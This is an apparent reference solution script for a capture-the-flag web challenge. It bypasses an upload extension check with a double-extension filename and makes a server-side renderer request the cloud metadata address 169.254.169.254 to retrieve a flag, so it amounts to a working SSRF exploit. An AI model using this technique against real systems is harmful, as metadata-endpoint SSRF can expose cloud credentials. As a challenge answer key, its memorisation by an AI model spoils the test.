#!/usr/bin/env python3
"""Reference solver for web-cms-uploadssrf.

Bypass the .png extension check with a double extension, and have the server-side
renderer SSRF the internal metadata flag endpoint.

    python3 solve.py http://HOST:PORT
"""
import json
import sys
import urllib.request


def _post(url, obj):
    req = urllib.request.Request(
        url,
        data=json.dumps(obj).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    return json.loads(urllib.request.urlopen(req, timeout=10).read())


def solve(base):
    base = base.rstrip("/")
    out = _post(
        base + "/upload",
        {
            "filename": "exploit.svg.png",
            "content": "render:http://169.254.169.254/latest/meta-data/flag",
        },
    )
    return out["rendered"]


if __name__ == "__main__":
    if len(sys.argv) != 2:
        raise SystemExit("usage: solve.py http://HOST:PORT")
    print(solve(sys.argv[1]))
